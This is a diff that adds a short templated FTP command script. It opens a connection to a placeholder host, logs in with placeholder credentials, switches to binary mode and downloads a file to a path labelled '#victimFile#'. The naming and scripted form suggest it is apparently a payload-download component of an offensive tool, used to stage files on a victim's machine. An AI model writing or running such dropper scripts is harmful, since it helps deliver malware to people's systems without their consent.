@@ -1,0 +1,6 @@
+open #host#
+#user#
+#pass#
+binary
+get #ftpfile# #victimFile#
+bye
